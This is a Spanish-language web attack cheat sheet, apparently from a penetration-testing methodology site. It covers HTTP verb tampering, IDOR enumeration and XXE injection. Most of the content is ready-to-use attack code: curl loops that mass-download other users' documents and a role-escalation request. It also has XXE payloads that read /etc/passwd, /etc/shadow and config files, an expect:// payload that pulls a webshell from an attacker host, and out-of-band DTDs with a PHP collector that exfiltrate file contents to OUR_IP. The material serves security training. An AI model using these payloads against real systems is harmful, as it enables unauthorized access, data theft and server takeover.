---
title: "Web Attacks"
description: "IDOR, XXE, JWT attacks y deserialización insegura."
sidebar:
  order: 9
  label: "Web Attacks"
---
> HTTP Verb Tampering para bypassar autenticación/filtros; IDOR para acceder a recursos de otros usuarios; XXE para leer archivos locales y exfiltrar datos via entidades XML externas.

---


## HTTP Verb Tampering

### Bypass de Basic Auth (HEAD)

```bash
# Si GET / pide autenticación → probar HEAD (no envía body, a veces bypassea auth)
curl -s -I http://target/admin/       # HEAD request
curl -s -X HEAD http://target/admin/  # explícito

# En Burp: cambiar GET → HEAD en la request
# Si responde 200 en vez de 401 → auth bypassada

# Otros verbos a probar:
# OPTIONS, PUT, DELETE, PATCH, CONNECT, TRACE
```

### Bypass de filtros (GET vs POST inconsistency)

```bash
# Filtro solo bloquea $_POST["param"] en PHP
# Ejecutar la acción con el parámetro vía GET (usa $_REQUEST)
curl -s "http://target/action.php?param=malicious_value" -X POST

# En Burp:
# 1. Interceptar POST request
# 2. Mover el parámetro del body a la URL (query string)
# 3. O cambiar POST → GET/PUT completamente

# Ejemplo: bypass de filtro de caracteres en username
# POST body: username=a|b → bloqueado
# GET: ?username=a|b → pasa (si el filtro solo comprueba $_POST)
```

---

## IDOR — Insecure Direct Object Reference

### Enumeración básica

```bash
# Parámetro numérico en URL
GET /documents.php?uid=1   # → cambiar a uid=2, uid=3...

# En APIs REST
GET /api/v1/users/1/profile
GET /api/v1/documents/1.pdf

# En body POST o JSON (buscar en Burp)
{"id": 1}
{"user_id": "abc123"}
```

### Decodificar referencias ofuscadas

```bash
# Base64 → decodificar → modificar → recodificar
echo "MTIzNDU2" | base64 -d   # → 123456
echo -n "789" | base64         # → Nzg5

# MD5 de ID
echo -n "1" | md5sum           # → c4ca4238a0b923820dcc509a6f75849b
echo -n "2" | md5sum           # → c81e728d9d4c2f636f067f89cc14862c

# Base64 + MD5 combinado (como en el módulo):
echo -n "1" | base64 -w 0 | md5sum | tr -d ' -'
```

### Mass enumeration — documentos por UID

```bash
# Script: descargar documentos de todos los UIDs
url="http://SERVER_IP:PORT"
for i in {1..20}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q "$url/$link"
    done
done
```

### Mass enumeration — IDOR con hash (base64+MD5)

```bash
url="http://SERVER_IP:PORT"
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" "$url/download.php"
    done
done
```

### Chaining IDOR — escalada de privilegios

```bash
# Paso 1: GET para obtener UUID/datos del perfil propio
GET /api/v1/profile → {"uid":"a1b2c3","role":"user","username":"alice"}

# Paso 2: PUT con UUID de otro usuario + campo modificado
PUT /api/v1/profile
{"uid":"TARGET_UUID","role":"web_admin"}

# Paso 3: verificar acceso con el nuevo rol
GET /admin/dashboard
```

---

## XXE — XML External Entity Injection

### Detección inicial

```xml
<!-- Confirmar que las entidades se procesan: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY company "Inlane Freight">
]>
<root>
<email>&company;</email>
</root>
<!-- Si la respuesta muestra "Inlane Freight" → XXE procesado → vulnerable -->
```

### Leer archivos locales

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
<name>test</name>
<email>&company;</email>
</root>
```

```bash
# Archivos clave a leer
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///var/www/html/config.php
file:///var/www/html/index.php   # puede fallar si tiene caracteres XML especiales
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

### Leer source code PHP (php://filter)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
<email>&company;</email>
</root>
<!-- Decodificar el base64 en el output: echo '...' | base64 -d -->
```

### RCE vía expect (si módulo instalado)

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://id">
]>
<root>
<email>&company;</email>
</root>

<!-- RCE completa: descargar webshell desde nuestro servidor -->
<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
<!-- $IFS reemplaza espacios; evitar |, >, { en el comando -->
```

---

## XXE avanzado — CDATA (archivos con caracteres especiales)

```bash
# Preparar DTD externo — xxe.dtd
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

```xml
<!-- Payload para el target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
<email>&joined;</email>
</root>
<!-- Muestra el archivo completo sin romper el XML, incluso con < > & -->
```

---

## XXE ciego — Error-based

```bash
# xxe.dtd en nuestro servidor
echo '<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '"'"'%nonExistingEntity;/%file;'"'"'>">
' > xxe.dtd
python3 -m http.server 8000
```

```xml
<!-- Payload: trigger del error que incluye el contenido del archivo -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
<root><email>test</email></root>
<!-- El error PHP incluirá el contenido de /etc/hosts en el mensaje de error -->
```

---

## XXE ciego — Out-of-Band (OOB) exfiltration

```bash
# index.php en nuestro servidor — decodifica y muestra el archivo exfiltrado
cat > index.php << 'EOF'
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
EOF
php -S 0.0.0.0:8000
```

```bash
# xxe.dtd — exfiltrar via HTTP GET con contenido base64
cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
EOF
```

```xml
<!-- Payload enviado al target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
<!-- El target hace GET a nuestro servidor con el archivo en base64 -->
<!-- El index.php lo decodifica y lo muestra en los logs del server -->
```

### Automatización con XXEinjector

```bash
# Instalar
git clone https://github.com/enjoiz/XXEinjector.git

# Preparar archivo de request (solo hasta la primera línea XML, luego XXEINJECT)
cat > /tmp/xxe.req << 'EOF'
POST /blind/submitDetails.php HTTP/1.1
Host: TARGET_IP
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
EOF

# Ejecutar — OOB con PHP filter
ruby XXEinjector.rb --host=OUR_IP --httpport=8000 \
  --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

# Resultados en:
cat Logs/TARGET_IP/etc/passwd.log
```

---

## XXE — SSRF via entidad externa

```xml
<!-- Escanear puertos internos / acceder a recursos internos -->
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://127.0.0.1:8080/">
]>
<!-- Si el servicio existe → responde en &company; -->
<!-- Si no → error o vacío -->
```

---

## Content-Type XML vs JSON

```bash
# Si el endpoint usa JSON pero puede aceptar XML:
# 1. Cambiar Content-Type a application/xml
# 2. Convertir el JSON a XML (herramienta online o manual)
# 3. Probar XXE — puede ser una superficie no testeada

# Herramienta: https://www.convertjson.com/json-to-xml.htm
```

---

## Pitfalls / Gotchas

- **Verb Tampering — HEAD vs GET:** HEAD es el más confiable para bypassar Basic Auth. El servidor procesa la request pero no devuelve body; si no hay comprobación de autenticación en el handler del verbo, pasa.
- **Verb Tampering — filtro $_POST vs $_REQUEST:** en PHP, `$_REQUEST` recoge GET+POST+COOKIE. Si el filtro limpia `$_POST` y la acción usa `$_REQUEST`, enviar el parámetro via GET bypasea el filtro.
- **IDOR en AJAX:** buscar llamadas a `/api/` en el código JS del frontend. Los parámetros de ID a menudo viajan en el body JSON o en el path de la URL.
- **IDOR hasheado:** si el ID parece MD5 o SHA, probar que sea el hash del ID numérico secuencial (1, 2, 3...) o del UUID.
- **XXE — entidad no mostrada:** si no hay campo de output visible → blind. Usar OOB antes que rendirse.
- **XXE — PHP con caracteres especiales:** `file://` falla para archivos PHP con `<?>`. Usar siempre `php://filter/convert.base64-encode/resource=`.
- **XXE CDATA — no se pueden mezclar entidades internas y externas directamente:** la solución es usar XML Parameter Entities (`%`) y un DTD externo.
- **expect:// requiere módulo PHP:** raramente habilitado en producción. Usar para RCE solo si el módulo está disponible (verificar con `php.ini` vía LFI).
- **OOB XXE y firewalls:** si el servidor target no puede hacer salidas HTTP → usar DNS OOB como alternativa (subdomain = datos base64, capturar con tcpdump).
- **XXEinjector — output en logs:** la herramienta no imprime directamente; revisar `Logs/TARGET_IP/`.
- **DoS por entity loop:** el payload "Billion Laughs" ya no funciona en servidores modernos (Apache/Nginx los detectan). No desperdiciar tiempo en producción.

---

## 🛠️ Herramientas Relacionadas (Ecosistema pwnVader)

<aside class="my-6 p-4 rounded-md border-l-4 border-[#cba6f7] bg-[#cba6f7]/5 not-prose">
  <div class="text-[10px] uppercase tracking-widest text-[#cba6f7] font-bold mb-1">
    Herramienta · hacking.pwnvader.com
  </div>
  <p class="text-sm text-zinc-300">
    ¿Estás analizando JSON Web Tokens (JWT) o necesitas codificar/decodificar payloads complejos durante tus pruebas? Evita controles de acceso y manipula firmas con el <a href="https://hacking.pwnvader.com/web/jwt" class="text-[#cba6f7] hover:underline">JWT Attacker</a>, o procesa recetas de codificación avanzadas de manera serverless con el <a href="https://hacking.pwnvader.com/encoders/recipes" class="text-[#cba6f7] hover:underline">Cyber Encoder Lab</a>.
  </p>
</aside>

---

## Cheatsheets relacionados

- [Using Web Proxies](/metodologias/web/using-web-proxies/) — interceptar y manipular requests XML/HTTP con Burp
- [File Inclusion](/metodologias/web/file-inclusion/) — php://filter para leer source, mismo wrapper que en XXE
- [SQL Injection Fundamentals](/metodologias/web/sql-injection-fundamentals/) — blind SQLi → misma lógica OOB que blind XXE
- [Cross-Site Scripting (XSS)](/metodologias/web/cross-site-scripting-xss/) — stored XSS puede combinarse con IDOR para impacto mayor
- [Attacking Common Applications](/metodologias/web/attacking-common-applications/) — XXE en APIs SOAP, WordPress y apps de terceros

